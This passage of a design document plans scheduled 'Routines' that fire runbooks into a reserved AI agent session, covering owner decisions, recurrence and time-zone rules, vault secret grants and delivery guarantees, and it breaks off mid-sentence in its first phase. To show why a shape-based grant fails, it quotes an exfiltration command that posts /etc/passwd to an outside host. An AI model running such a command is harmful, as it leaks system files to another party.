# Routines

A schedule that fires a runbook into a session reserved for it. One occurrence a day at most.

# Words

Used precisely throughout, because several of them were used loosely and the looseness hid a bug.

- **Occurrence:** one scheduled slot, identified by its routine and its scheduled instant. It is a
  durable record, not an event.
- **Fire, or run:** the gateway's attempt at an occurrence. One AUTOMATIC attempt per occurrence,
  ever. Run now on a missed occurrence is a second attempt carrying the owner's fresh authorization,
  which is why it is allowed and why the automatic path may not reach it.
- **Dispatch:** the moment the gateway commits to having sent a rendered nudge into the reserved
  session. The last thing it observes about the work.
- **Execute:** what the agent then does. The gateway never sees it, which is why no surface says a
  routine succeeded.
- **The routine's zone:** the gateway's own zone, recorded on the routine when it was saved. There
  is exactly one zone in the model. "Server time" and "the routine's zone" name the same thing, and
  the record exists so that changing the container's zone cannot reinterpret routines already
  written.

# Findings

Facts gathered before the first question. Kept here because they bound every answer.

## Router scheduled sends are the nearest existing thing

`createScheduledService` owns durable per-Domain records in `OwnerStateStore` with versioned CAS.
Timers are process memory only; `rearm` re-arms every armed or firing record at startup, and a
record left firing is reset to armed. The fire path is effectively exactly-once for inbox-row
creation: it claims the record as firing, then appends through `appendInboxRow` keyed by
`recordId`, so a crash between append and mark replays the ledger result rather than appending
twice.

What it does not do: recurrence, a minimum interval, or addressing the owner's phone. `fireAt` is a
bare timestamp, a past one fires immediately, and the target is a composite session.

## The phone can wake itself on time, which turned out to matter only for reading

`ScheduledSendOps` with `SwitchboardService` arms `RTC_WAKEUP` alarms through
`setExactAndAllowWhileIdle`, with an inexact fallback. `ScheduledSendAlarmReceiver` takes a bounded
wakelock and revives the service, `BootReceiver` re-arms after a reboot, `ClockChangeReceiver`
re-evaluates after a time or timezone change, and startup scans persisted records for anything
overdue.

`ServiceNotifications` with `NotificationReceiver` already implement notification action buttons
that act without opening the activity.

## A Router row alone cannot be punctual

`pushOwnerRow` is best effort and reaches only a bound socket. Otherwise the phone polls, and
`IdlePushbackManager` backs off to aligned half-hourly, hourly, and finally twice-daily alarms. A
row authored at 09:00 could therefore surface at 20:00.

This drove the design while the schedule lived away from the executor. Once the gateway both holds
the schedule and runs it, the gateway owns the timing decision, and the only thing a Router row is
late for is the owner reading about it. That is what the doze wake is for. It does not make a run
punctual: a run still waits on an idle session, and can end as a miss.

## An interactive fire cannot pre-decide everything

About `ConsoleOp.RunbookFire`, the interactive path the owner taps. A routine does not travel it; a
routine's occurrence is dispatched by the gateway's own runner.

`ConsoleOp.RunbookFire` carries `runbookId`, `values`, `into`, and an optional `expectedRevision`,
and `createRunbookFireHandler` does the whole render and deliver. A routine written days earlier
cannot assume the runbook still holds the revision it approved, that its parameter values still
satisfy the current placeholders, or that its target session still exists.

Any authenticated producer of the same signed encrypted owner operation can invoke an interactive
fire. The
phone's sheet is not privileged.

`DurableOpStore` persists completion, but an in-flight marker carries no request, so a Gateway
restart mid-fire can re-execute.

# Questionaire

Numbered as they were put to the owner, so the plan and the conversation agree. There is no question
four: a draft of it was folded into question three before it was asked.

## Question 1 - What does the schedule actually do?

Q: At the scheduled moment, does a routine remind and wait for a tap, fire itself from the phone, or
fire without the phone through the Router?
A: Fire itself, without waiting for a tap.

Superseded in part by question 8. "From the phone" was how automatic firing was reached, not what
it means. The gateway fires; the phone is not in that path at all. What survives is the answer to
what was actually asked: no tap.

> good point. B it is.

The point agreed with: once Remotes exist, a routine whose output IS the reminder makes a
confirming tap pure friction.

## Question 2 - How long does the authorization to fire automatically stay valid?

Q: The scheduled moment passes unserved and the runner returns hours later. Does it still fire?
A: Catch up once, within a grace of half the schedule period or half a day.

Asked about a phone that was off, since the phone was then the executor. It now means the gateway
was down, or its reserved session was busy, or the host was unreachable. The answer is unchanged.

> Catch up once up to half the schedule period or half a day

Superseded by the owner in question 5: "grace could just be half a day instead of trying to
predict." The formula is gone. The grace is a flat twelve hours from the scheduled instant, and no
implementation should carry a period at all, since M W F and bi-weekly have no single period to
halve.

## Question 3 - What recurrence should a routine support?

Q: Daily at a time, selected weekdays, or a full calendar model?
A: Weekdays with a week interval. Daily, weekly, chosen days, bi-weekly, weekends.

> Configurable. Could be daily, weekly, certain days of week (M W F), bi weekly, weekends, whatever.

All of those collapse into one model: a set of weekdays, an interval in weeks, and an anchor week.
Daily is all seven every week, weekends is two days every week, bi-weekly is the chosen days every
second week. No monthly, no every-N-days, no cron. The one-day floor holds for free, since a weekday
cannot be picked twice in a week.

## Volunteered - A missed occurrence gets a recovery panel

> ohh that manual tap. let's recycle it. For severe misses, it will show that panel that it missed
> the scheduled X hours ago. Button to run now, or dismiss (forever).

So the tap survives as a recovery surface rather than the normal path. Dismissing is scoped to the
occurrence, not the routine.

## Question 5 - Where does a routine execute across repeated runs?

Q: A fresh session each time, a session the routine keeps, or one existing session it is bound to?
A: A session reserved for that routine and reused only by it.

> B. So a runbook you target a session, or target a host and it makes a session right?
> A routine will target a special session that only gets reused for itself.

Also settled here: the grace is simply half a day, with no formula.

> ohh well if it is simple, grace could just be half a day instead of trying to predict.

## Volunteered - A routine session outlives its own context

The sharpest requirement so far.

> In the off chance that it goes to compaction length, we need a way for it to be able to remember
> what the routine is. Like a MCP tool only accessible to this session? `get_session_routine` to get
> a `session_routine` prose or something.
> When firing it onto the channel, you nudge the reminder: "Owner issued a routine. Call
> `get_session_routine` for the instructions. If any blockers occur, channel_reply".
> Something like that. you can massage it

A reused session compacts by construction, so instructions delivered as chat text on day one are
gone by day forty. The fire carries a short nudge, and the standing instructions are re-readable
through a tool rather than remembered.

## Question 6 - What happens when the next occurrence is due and the session is still working?

Q: Wait for idle inside the grace, miss it immediately, or deliver into the active work?
A: Wait for idle, inside the twelve hours. Past that it is a missed occurrence with the panel.

> A

## Question 7 - What does a routine do when the phone changes timezone?

Q: Stay at 09:00 where it was scheduled, follow the phone, or let each routine choose?
A: The editor shows the owner's own time. Saving converts to the server's, which is canonical.

> Time zone of the time editor shown in User's time. Converted to Server's upon submission or save.

No zone picker. The gateway container is pinned to `America/Los_Angeles`, so the canonical zone is
a real one that observes daylight saving, and a wall-clock schedule does not drift twice a year.

## Volunteered - Runbooks have no users yet, and no delete button

> ohh and btw nobody uses Runbooks yet, so changes can be breaking. That said, there doesn't seem
> to be a delete button on a runnook

Breaking changes to the runbook and routine shapes are allowed, so the optional-field-then-required
dance is not needed for either. The deploy ORDER still matters, because the four components update
on separate triggers and a console can be older than its gateway for a while.

The delete gap is smaller than it looks: `RunbookStore.remove`, `ConsoleRunbookDeleteResult` and
`RunbookOps.delete` all exist and work. Nothing in the phone's UI calls any of it. Only the button
is missing.

## Question 8 - With several phones, may every one of them run a routine?

Q: Every approved phone, or one primary with the others as backup?
A: Every phone configures. The gateway itself is the scheduled runner.

> Any phone may configure them. Gateway is now the scheduled runner of them

The second clause is larger than the first. The gateway fires on its own timer, so no phone is in
the firing path at all.

## Question 9 - Which version ships first?

Q: The complete release, a durable core with four things deferred, or a pilot?
A: The complete release, planned in phases.

> A. Plan it in phases.

So session creation and recreation, the snapshot protocol and its tool, globally convergent panels
and actions, the doze wake, and the two inherited defects all ship. Nothing is deferred, which
means the vault question needs a real answer rather than being dissolved by scope.

## Question 10 - What may an unattended routine do with a secret?

Q: Ask normally and surface the fact, refuse the vault entirely, or pre-authorize named secrets?
A: Pre-authorize at creation, and fall back to asking when a secret is not covered.

> Can configure to link secrets that they have pre-approval for during creation. During runtime if
> the secret was a miss, it asks like normal.
> But think carefully how you plan this. We have Remotes plugin coming up in the future that would
> also utilize secrets.

The fallback keeps the attention record: a request that goes unanswered must not be lost silently,
since nothing today reports an expiry and the agent's refusal is indistinguishable from a denial.

The Remotes note is the binding constraint. A grant must not be a routine feature that Remotes later
copies. Its subject is a holder, and a routine is the first kind of holder rather than the only one.

## Question 11 - How wide is a pre-approval? [superseded by 13]

Q: The secret and a command shape, the secret alone, or the secret surviving a runbook edit?
A: The secret and an optional command shape.

> A. Optional Command Shape though. Not all Runbooks are equally dangerous.

Superseded once the shape was found not to constrain. See question 13.

## Question 13 - What does a shaped grant actually pin?

Q: A stricter representation, the existing granularity knowingly, or no shape at all?
A: No shape. The grant names an entry and nothing more.

> ohh true. let's just forget about that optional security. Swiss cheese security is not security at
> all

A shape that keeps a program and its first argument would have read as a constraint while
authorizing `--force` and a `-d @/etc/passwd`. Dropping it is the honest move: the grant now says
exactly what it does, which is that this routine may use this secret.

## Question 12 - Does a grant expire on its own?

Q: Should a pre-approval age out, or last until something revokes it?
A: No expiry.

> nah skip expires. otherwise Routine wouldn't have an ease of use. Secrets can often be made to
> expire anyways

The expiry would sit in the wrong layer. A secret that should age already can, at the secret. A
grant that died on an arbitrary Tuesday would break the unattended run the feature exists for, and a
control that gets worked around is not security. The grant still dies with the thing that justified
it, and the routine shows each linked secret with when it was last used, so one nobody remembers
agreeing to is visible rather than silently expired.

## Question 14 - How would the owner know a routine achieved nothing?

Q: Liveness, an agent report contract, or nothing?
A: Liveness. Never success.

> A

The gateway records whether the reserved session did anything at all after the nudge, and whether
the agent ever called `get_session_routine` to read its instructions. Those are facts about the
mechanism. It still never stores a claim about whether the work was any good, because it still
cannot know one. A report contract was refused on the grounds that an agent failing badly is the
one whose report is least trustworthy.

## Question 15 - What bounds a routine that keeps working?

Q: A hard runtime limit, an authority cutoff, or nothing automatic?
A: Nothing automatic. The owner stops it.

> C

Paired with question 14 this is coherent rather than blind: liveness reporting says a run is still
going, and the owner decides. What was refused is automatic termination, not visibility.

It is also the honest choice given what is enforceable. A token or money budget is impossible: the
gateway dispatches and then observes nothing, so it can count neither tokens nor turns nor spend.
An authority cutoff would have bounded what a run may reach while bounding nothing it costs, which
is a limit in name. Provider limits remain the only real ceiling.

## Question 16 - What happens to a routine when its runbook is edited?

Q: Keep the pin and stop the routine until re-saved, or let the routine carry its own approved copy
and keep running until the owner adopts?
A: Keep the pin. No edit-time dependency tracker.

> A. But for simplicity you don't need to implement a tracker of how many it affects. I know and I
> did it on purpose.

An edit stops every routine pinned to that runbook until each is re-saved, and the owner accepted
that cost knowingly rather than having it discovered for them. So the edit screen counts nothing,
warns about nothing, and offers no bulk re-authorization.

This is what makes the head-only store sufficient. `RunbookStore` keeps one record per id, so a
pinned revision can be compared against the head but never re-read. Detecting the move is all this
answer needs. The alternative would have required immutable revisions or a copy stored with the
routine, and neither is being built.

Three others were refused. Auto-adopting runs unattended words the owner never approved. Splitting
on whether a routine links a secret is not a danger classifier, since the session already holds
shell and network either way. Pinning the placeholder set rather than the body would let a body
become something entirely different under identical parameters.

## Question 17 - Is a runbook's revision one number, or one per gateway?

Q: The phone holds one copy and keeps the higher revision, so a gateway that mints its own successor
cannot have that answer adopted. Hold a copy per gateway, or make one gateway canonical and the rest
replicas?
A: A copy per gateway.

> A copy per gateway I guess. If one is down, it will just have to catch up when it comes back.

The revision stops being a property of the runbook and becomes a fact about one gateway's copy of
it. Each gateway mints its own successor, so the same content sits at 6 on one and 4 on another
without either being wrong.

That answer dissolves the case this phase built the Overwrite affordance for. Catching up a gateway
that was down stops being an overwrite: the phone pushes the content naming the revision it read
from THAT gateway, and the gateway mints the next one. No forcing, because there was never a
disagreement, only a gateway that had not been told yet. Overwrite survives for the case that is
genuinely a conflict, where another phone has already moved the copy this one is editing.

What Phase 1 still has to settle is which CONTENT wins when two gateways hold different bodies,
since a revision comparison can no longer answer it across gateways.

# Rulings taken

Design decisions, not owner questions. Recorded so they are not relitigated. In the order they were
decided, with the ones that were later overturned kept and marked, because the reason a ruling
changed is the part worth having.

- **The gateway owns the routine end to end; the phone configures it and watches:** the gateway
  holds the runbook, the reserved session, the idleness fact, the clock and the dispatch, so a
  routine is one gateway-local aggregate rather than a record reaching across a service boundary.
  The Router carries signed operations one way and durable owner rows the other, and holds no
  routine. The phone creates, edits, enables, disables, and shows what happened. It never decides
  that a routine should run.

  Superseded twice: the Router held the schedule while this was a reminder-first feature, then the
  phone was to trigger the gateway. Both are gone.
- **Doze wakes for the answer, never for the run:** an alarm near a due time exists only so a deeply
  idle phone drains the result promptly instead of at its next twice-daily poll. It authorizes
  nothing, initiates nothing, and a phone that never wakes changes only how quickly the owner reads
  the outcome. It rides the existing earliest-wake coordinator rather than adding a second alarm
  system beside `ScheduledSendAlarmScheduler`.
- **One execution loop, or the same occurrence runs twice:** the timer, the reconciliation at
  startup, a manual Run now, and several callbacks noticing the session go idle all converge on one
  occurrence. Each enters one CAS on the occurrence, inside the gateway, and a terminal result is
  durable before recurrence advances.
- **Saving the routine is the approval event:** without a tap there is nothing else to approve at.
  Saving binds the runbook id, the exact revision, complete parameter values, and the target. A
  runbook edit stales that authorization rather than silently updating it.
- **The gateway checks the pinned revision itself:** the phone's `RunbookOps` synchronizes copies
  before an interactive fire, and that path is untouched. A routine reaches none of it. The runner
  compares the routine's pinned revision against its own store immediately before preparing, and a
  mismatch becomes `needs_review` rather than a fire.
- **A grant's subject is a holder, and a routine is only the first kind:** grants are session-bound
  today, and `decisions.ts` says so in its first line. A routine needs one bound to itself, and
  Remotes will need one bound to a remote. Build the subject as a holder now, or Remotes copies a
  routines feature and the two drift.
- **Only the owner creates a grant, and nothing in a session can:** verified rather than assumed.
  `decisions.grant` is reachable from exactly one place, `onApproved` in `composeVault`, which runs
  when the owner approves on their phone. A routine's grants are configured at routine save, on the
  phone, and there is no path from inside the reserved session to minting or widening one. That
  property is the whole reason a standing grant is tolerable at all, so any new route must preserve
  it.
- **A standing grant names an entry and claims nothing else:** no shape, because the only matcher
  available keeps a program and its first argument and discards the rest. `git push origin main`
  and `git push origin --force main` are one shape to it, and `curl https://example.com` covers
  `curl https://example.com -d @/etc/passwd`, while `vault_run` runs a shell line through `sh -c`.
  That granularity is defensible for a thirty minute window approved by a waking owner and
  indefensible as a permanent unattended one. Offering it would have manufactured a confidence the
  mechanism cannot support.

  Window grants keep it. They are a different thing, bounded by the owner's attention.
- **The session is the identity, so during a run the grant covers everything in that session:** the
  vault route knows which session is asking and nothing finer, and a routine's reserved session is
  an ordinary session. So while an occurrence is running, work the owner types into that session by
  hand is covered too. The dispatch-to-idle window is what keeps this narrow rather than permanent,
  and it is the reason that window exists. Stated because the alternative is a reader assuming the
  grant somehow knows which work is the routine's.
- **Idleness closes a grant but proves nothing about processes:** presence is derived from
  observation and can be late, wrong, or absent. A false idle closes early and the next secret use
  falls to an ordinary request, which stalls a routine rather than breaking it. A missing idle leaves
  the grant open to the twelve hour deadline, which is why the deadline is the hard edge. Closing is
  idempotent, and it never claims to have stopped a process already holding the secret.
- **A closed grant stops new uses, not one already running:** `vault_run` answers `running` once its
  wait budget is spent while the `sh -c` process it started carries on, and only an explicit
  withdraw or an MCP shutdown kills that process group. The secret is already in that process's
  environment by then. This is a stated limitation rather than something to design around: the
  secret was released for that use, and revocation was never going to reach inside a running
  process.
- **A grant is live from dispatch until the session next goes idle, or the deadline:** the reserved
  session outlives every run and the owner may work in it by hand, so a grant tied to the session
  would cover that too. This is the one real narrowing left after the shape went, and it costs
  nothing, because a routine only needs its secret while it is working.

  Corrects my own first attempt, which said the grant closes when the occurrence leaves the
  runner's hands. That is `dispatched`, which is the moment the agent BEGINS. The grant would have
  expired before the work that needs it started. The closing edge cannot be the end of the work,
  because nothing observes that, so it is the two things the gateway does hold: the session going
  idle, and the twelve hour deadline, whichever comes first.
- **Link a secret only to a routine whose runbook does not read what you do not trust:** an entry
  scoped grant means the agent may use that secret for anything it can be talked into running, and
  it reads repositories, issues and pages. This is a guideline rather than a mechanism, and it is
  written down because pretending otherwise is what the last ruling refused to do.
- **A linked secret says plainly what it permits:** every grant is unconstrained now, so a surface
  listing a routine's secrets says that rather than implying a limit that no longer exists.

  Replaces a ruling written when the shape was optional, which told the editor to ask for one.
- **A grant dies with the thing that justified it, and that beats the window:** editing the routine,
  disabling it, deleting it, deleting the entry, or the pinned runbook revision moving. An edit is
  where the words that earned the grant change, so it cannot survive one. Revocation takes effect at
  once and outranks the dispatch-to-idle window: a routine edited mid-run loses its grant then, not
  when the session next goes quiet.
- **A routine's authorization is not a vault grant:** authorizing a routine to send instructions
  grants no secret access. Vault approval keeps its own shapes, which are not simply per use:
  `decisions.ts` offers once, a thirty minute operation window, and a session grant capped at eight
  hours. All three are bound to a session, which is why a standing grant to a session reused
  forever would be wrong: it would cover unrelated work between occurrences, survive a runbook edit
  that changed the instructions it was granted for, and move unpredictably when the session is
  recreated.
- **Catch up once means one run and one panel, not a backlog of either:** among the instants that
  elapsed, only the newest still inside its grace may fire. The older ones are not materialized one
  by one; reconciliation writes a single missed occurrence for the newest instant it could not
  serve, carrying how many it stood for. A week away is one run at most and one panel, never seven
  of either.
- **Past the grace the automatic authorization expires:** the occurrence becomes missed and
  recurrence advances. The owner may still fire it by hand from the recovery panel, which is a
  fresh authorization rather than the expired one resuming.
- **The gateway computes recurrence and answers one absolute instant:** the phone displays that
  instant and may wake near it to poll. A calendar model on both sides would be two engines
  drifting apart, and this repository already pays for every twin it keeps.
- **The grace is a flat twelve hours, because half a period is not a real quantity:** an M W F
  routine has a two-day gap and a three-day gap, so it has no single period to halve. Twelve hours
  comes straight from the owner's own "half a day" and needs no formula.
- **The recurrence record is weekdays, a week interval, a start date, a local time, and a zone:**
  the start date IS the anchor and it is shown as "starting", never stored as a week-of-year or an
  odd-even parity. Parity kept out of sight is mysterious state, and mysterious state is what makes
  a bi-weekly routine fire on the wrong week with nothing to point at. Normalize to the Monday of
  the start date's week and count whole calendar weeks.
- **Enabling starts at the next selected weekday the anchor allows:** for a weekly routine that is
  simply the next selected day, so one enabled on a Sunday starts tomorrow. For a bi-weekly one the
  anchor decides the parity, and the start date is what the owner sets to move it. Picking the
  nearest selected day regardless would silently flip the parity the start date exists to hold.
- **Dismissing an occurrence and disabling a routine are different actions:** one settles a single
  panel, the other stops the schedule. Neither is a rename of the other in any surface.
- **A routine stores a target policy, never a stale session id:** the occurrence resolves that
  policy into a concrete target immediately before firing.
- **`get_session_routine` answers the fire-time rendering, never a fresh one:** the gateway renders
  once through the same function the fire uses, keeps that snapshot, and serves it back. Rendering
  again on the tool call would let a runbook edited on Tuesday silently rewrite instructions issued
  on Monday, which is the approval binding leaking away through a side door.
- **Snapshots are keyed by occurrence, not by "latest":** occurrence N can still be working when
  N+1 lands, and after a compaction N would ask for its instructions and be handed N+1's. The nudge
  carries the occurrence id and the tool requires it.
- **The tool is scoped by the session token, not by a capability:** `/capabilities` is ungated by
  design and answers for the whole gateway, so it cannot say what one session may read. The route
  authenticates `x-session-token` and resolves the record through
  `SessionAuthority.resolveConfirmedManagedSession`, which is how a session already proves itself.
  A routine capability would be a machine-wide claim over a session-owned thing.
- **The nudge names the owner as the author:** the agent did not schedule the routine, and after a
  compaction the nudge may be the only provenance left. "The owner issued routine occurrence
  `<id>`. Call `get_session_routine` with that id for the instructions. If blocked, tell the owner
  with `channel_reply`."
- **No rotation count on the reserved session:** it is reset by hand or recreated when it is gone.
  An arbitrary "every N runs" would throw away the continuity that chose a reserved session.
- **A materialized occurrence freezes its instants:** `scheduledAt` and the twelve-hour deadline are
  fixed when the occurrence is made. A later zone change moves only occurrences not yet materialized,
  and neither travel nor a long wait for an idle session may extend a deadline.
- **Every calendar calculation uses the routine's zone, never the device's:** weekday matching and
  anchor-week arithmetic included. Computing the anchor week in the phone's zone while the time uses
  the routine's is the defect this rule exists to make impossible. A Los Angeles Monday shown in
  Tokyo is still that Monday, so the UI names the zone rather than quietly relabelling the day.
- **What is expensive to defer is authority, identity and the meaning of a state, not fields:**
  adding a versioned optional field later is ordinary evolution here and the deploy rules already
  cover it. What cannot be retrofitted is who decides a thing, what a thing is called, and what a
  state means. So the reserved session is a durable spawn recipe bound to the routine from the
  start, never a stored physical session id, because the id bakes in the wrong owner. The nudge
  carries an occurrence id and the instructions live in a per-occurrence snapshot from the start,
  because delivering the text inline first would make the tool a replacement for the delivery
  protocol rather than an addition to it. Run now and Dismiss are gateway-authoritative CAS with
  versioned state and tombstones from the start, because making them local first would be a change
  of authority later. What genuinely stages: how fast a stale panel disappears from a second phone,
  the doze wake, and recreating a session that has gone.

  Corrects an earlier framing of mine that split this into "the record" and "behaviour". That was
  too crude: a dormant field is an untested contract, and several things that look like behaviour
  carry an authority or identity decision inside them.
- **A fire is dispatched, not succeeded:** the gateway learns that instructions were delivered and
  nothing more. Nothing observes whether the agent finished the work, so no surface may say
  "succeeded". Nothing re-attempts delivery either; the only thing that repeats is the wait for an
  idle session, and it lives inside the same twelve hours.
- **No phone is in the firing path, so the cross-device race does not exist:** the gateway's own
  timer starts the run. Phones configure, watch, and recover a miss by hand.

  Superseded twice. First a Router claim with a lease, which could only move the race, since a
  lease cannot tell a dead phone from a slow one. Then a gateway acceptance that every phone raced
  to submit. Both were answering "which phone fires", and the question turned out to be wrong.
- **The twelve hours is an authorization window, not a transport timeout:** it survives the move to
  the gateway unchanged. It now covers the gateway having been down, and equally the session or
  host being busy or unreachable while the gateway itself is fine.
- **Only the gateway can decide the whole question at once:** whether the revision is still
  authorized, whether the occurrence is still eligible, whether the reserved session is idle,
  whether anyone already triggered it, and whether the snapshot and nudge are durable. Splitting
  that across two services is what created the lease.
- **The existing ledger cannot dedupe two phones:** `recordId` is
  `op:${owner}/${conversationId}/${opId}`, and two phones carry two conversation ids, so one
  occurrence submitted twice reads as two operations. Verified, not assumed. The occurrence store
  is keyed by the occurrence for exactly this reason.
- **`chainedTimer` is extracted, not copied:** the Router already owns one for delays past the
  32-bit ceiling. A second on the gateway would be the drift this plan keeps refusing. Move its
  handle shape and its ceiling constant together.
- **A gateway that was down reconstructs rather than replays:** on boot it derives elapsed
  occurrences from the recurrence rule, keeps the newest if it is still inside its twelve hours,
  turns anything older into a single severe miss, rearms the next deadline, and pushes the result
  to the owner. A week away is one panel.
- **At most once, and the loss is visible:** the occurrence is marked `dispatched` BEFORE the nudge
  is handed to delivery. A crash in between therefore loses the nudge rather than sending it twice,
  and the occurrence sits there saying it dispatched while liveness says nothing ever happened,
  which is exactly the signal question 14 asked for.

  Exactly once was not available. `ChannelDeliveryCoordinator.accept` re-offers a duplicate on
  purpose, and the acceptance and the occurrence write cannot be one transaction, so the choice was
  only ever which way to fail. A routine that silently runs twice can deploy twice; one that
  silently does not run is caught by the signal the owner already chose. An earlier draft promised
  a guarantee here and deferred the mechanism, which was the promise being written before it was
  earned.
- **The occurrence state is what stops a second nudge, not the delivery id:**
  `ChannelDeliveryCoordinator.accept` re-offers a duplicate on purpose, and says so: "offering it
  again is what a retry of a lost reply wants". So a delivery id derived from the occurrence stops
  a duplicate ROW and nothing else. The guarantee has to be that a `dispatched` occurrence never
  re-enters delivery at all. Derive the id anyway, for the row, but do not mistake it for the
  guarantee.
- **The gateway waits on its own session, and nobody asks it to:** idleness is a fact it holds
  directly, so a due occurrence sits in `waiting_idle` until the reserved session frees up or the
  twelve hours run out. There is no stale copy of that fact anywhere, because no other process
  reads it.
- **A panel is drawn from the occurrence's current state, not from the arrival of a row:** a phone
  that was off drains an old due row and must fold the later dismissal before it draws anything.
  Dismissing on one phone cancels the notification on the others.
- **A newly approved phone gets the current picture, not the remaining events:** it needs the
  routine projection and its next alarm, not only changes from the moment it joined.
- **The routine records the zone it was saved in:** without it the canonical zone is a line in the
  Dockerfile, and editing that line would reinterpret every stored routine at once. Recorded, a
  change reaches new routines only.
- **Convert the date and the time together, never separately:** a Monday on the phone can be a
  Sunday on the server. The phone sends its zone and a reference date, resolves the entered date,
  weekday and time to one instant, and the server date that instant falls on is what gets stored.
  A time like 01:00 cannot be converted without knowing which date's offset applies.
- **Run now is a request, not an execution:** the button submits an authenticated owner operation
  and the gateway arbitrates it through the same CAS as any automatic run. A phone that renders or
  delivers anything itself has reintroduced the model this plan spent three reversals removing.
- **Every transition names its predecessor:** each trigger does one CAS from an explicitly allowed
  prior state, so a stale reader cannot validate, render and deliver in parallel with another. The
  automatic path may not proceed from `missed`, and Run now may proceed from nothing else.
- **Dispatch re-reads whether the routine is still enabled:** disabling between `prepared` and
  delivery must stop it, so the final CAS carries both the routine's enabled flag and the
  occurrence's prepared version. Otherwise a routine switched off still speaks once.
- **An occurrence is identified by its routine and its scheduled instant:** reconciliation looks
  the row up before it materializes anything, and a dismissed tombstone outranks the recurrence
  rule. Reconstructing purely from the rule would resurrect a panel the owner already dealt with.
- **A miss records why it was missed:** the gateway having been down, the session having stayed
  busy, and the host being unreachable share a deadline but not a story, and reconciliation must
  not read "never observed" as "waited and gave up".
- **The states are `due`, `waiting_idle`, `prepared`, `dispatched`, `missed`, `dismissed` and
  `needs_review`:** the last is where a runbook whose revision moved lands, and it is terminal for
  that occurrence, notified, and cleared by re-saving the routine.
- **A periodic reconcile, because a timer only counts down:** `ambient.setTimer` schedules a delay
  and a forward clock jump does not wake it, so a machine resuming from suspend could sit past a
  deadline holding a timer for the old delay. A bounded tick compares stored deadlines against
  `ambient.now()`.
- **The runner's lifecycle needs two things the gateway does not have yet:** `composeGateway` calls
  `context.activate` at the end of composition, so the runner arms from that callback and never
  from construction, which also keeps it silent through an arming or standalone boot. And
  `composeListener`'s `close` flushes first, deliberately, "while writers are live", with no
  admission gate and nothing to drain. A runner needs both added: stop taking work, wait for the
  attempt in flight, then let the existing flush run. Stated as a correction, because an earlier
  draft of this plan described that ordering as if it already existed.
- **The phone says whether it edited anything, and an untouched save changes nothing:** a schedule
  reopened abroad submits values indistinguishable from a real edit made there, so the save carries
  an explicit intent and the base it was opened from. The gateway verifies that base, then either
  keeps the canonical fields byte for byte or treats the save as the rewrite it is and bumps the
  revision. Converting on every save would let travel rewrite a schedule nobody edited.
- **`nextOccurrence(rule, after)` is strictly later than `after`:** an inclusive search evaluated
  exactly at a scheduled instant rematerializes the occurrence it just ran. Advance by local
  calendar date, never by adding a day in milliseconds.
- **Monday is ISO weekday 1 and the floor is a calendar date:** the anchor cannot depend on a
  locale whose week starts on Sunday, and two occurrences may legitimately be twenty-three hours
  apart across a spring transition, which is still two different local dates.
- **The reserved session needs no rollover, because compaction is one:** a session that runs every
  morning sheds its old context by compacting, which is the same trade a rollover would have made
  and costs nothing to build. What compaction endangers is the instructions, and
  `get_session_routine` already answers that: the authoritative words are re-readable rather than
  remembered. What is left is a transcript growing on disk, which is housekeeping and not a routines
  problem.
- **A spring gap moves forward, a fall overlap takes the earlier offset:** 02:30 on a day that has
  no 02:30 becomes the first valid instant after the gap, and 01:30 on a day that has two becomes
  the first of them. Stated because "handle DST" is not a rule and two implementations would differ.
  Pinned by vectors.
- **One local time cannot describe a whole series:** Los Angeles observes daylight saving and Tokyo
  does not, so a routine fixed at 09:00 server time shows as 01:00 for part of the year and 02:00
  for the rest, and near midnight even the weekday moves. The schedule line states the canonical
  rule in server time; only the NEXT run is converted to the owner's.

# Defects this feature inherits

Both are in shipped code and both were found by auditing the plan, not the code. Neither is caused
by Routines, and Routines cannot be correct while either stands.

- **`RunbookStore.put` accepts any higher revision:** it refuses a lower one, and refuses a
  different edit at the same revision, but never requires the increment to be by one. Its own first
  line says "the phone is every runbook's sole author", which was true until any phone may
  configure. A stale phone can therefore label its old copy revision 3 and overwrite revision 2.

  The fix: `put` stores only at exactly one past what it holds. A first write for an id lands at
  whatever revision it carries, since a second gateway legitimately meets a runbook mid-life. A
  retry of the same content at the same revision still succeeds, because that is a lost answer
  rather than a lost update, and that is the behaviour the store already has. Anything else is
  refused with what is actually stored, which is what the editor's Overwrite affordance already
  reads.

  No separate base-revision field, though an earlier draft of this fix carried one. `RunbookDraft`
  already mints one past the revision it was opened at, so the increment IS the claim about what was
  read, and a second field would have been a copy of it that could disagree.

  A gateway left behind cannot be caught up by an ordinary put, and no revision arithmetic can tell
  a copy that descends from what it holds from a divergent one. So catch-up is an explicit
  `overwrite`. `RunbookOps.sync` never sets it and `save` defaults it off; the editor passes it only
  for the owner's Overwrite, and the fire sheet only for the button beside a refusal. Nothing
  automatic reaches it, which is what keeps the strict rule from being decorative.
- **`createSession` launches whether or not it created the record:** `adoptOrReattach` answers
  `created`, and nothing reads it before `tryWakeTeam` or `relayToHost` runs. `markCreateInFlight`
  records presence without joining. The relay path carries a `dedupKey` that may absorb it; the
  wake path carries nothing.

  The fix: a launch already in flight for that team is joined rather than started again, and the
  joiner takes its answer. That keeps today's behaviour for an ordinary create, where there is no
  second caller, and closes the case Routines makes ordinary.

  It is the in-flight launch that gates, not `created`, though an earlier draft of this fix said
  `created`. A record that exists with nothing launching is the ordinary reattach of a session that
  has gone to sleep, and it must still launch. Gating on `created` would have left the owner unable
  to wake it.

  `WakeService` holds the launch now, beside the wake it already held, so presence starts and ends
  once however many callers arrive.


# Open

- **Remotes.** Named in the original request, and they do not exist yet. The grant's holder shape is
  built so a remote can hold one unchanged. The target policy has no remote variant, and Routines
  ships without one until Remotes exists.

# Plan

**`# Rulings taken` wins.** These phases restate consequences drawn from it, and a restatement drifts
from what it was drawn from. Twice already a ruling landed and left a superseded model standing here.
Where the two disagree, the ruling is right and the phase text is the bug, so fix the phase text
rather than building what it says.

Each phase lands with its own tests. Phase 6 is where the cross-system scenarios go, not where
correctness is first checked.

Runbooks have no users, so the runbook and routine shapes may change freely and no field needs the
optional-then-required dance. Deploy order still holds: the gateway ships before the console for
anything it emits.

## Phase 0 - The inherited defects ✅

Both, each with its own test. `createSession` is directly load-bearing now that a routine creates
and recreates its reserved session. The runbook revision jump would not by itself make the runner
execute the wrong words, since the recheck before preparing refuses a moved revision, but it has to
land before any phone can edit a routine and before the corrected `runbook_put` shape is generated.

Independently useful on its own, which no later phase is.

### Bug Classes

**Mechanism:** revision minting on the phone. **Class:** an overwrite mints a revision the phone's
own library will not take back, so the gateway stores it and the library keeps its old copy, and the
two disagree while the owner is told the save was refused.

Patched three times in one lap, which makes it a design bug rather than three accidents:

1. The editor's Overwrite rebased onto the gateway's held revision. Against a gateway that was
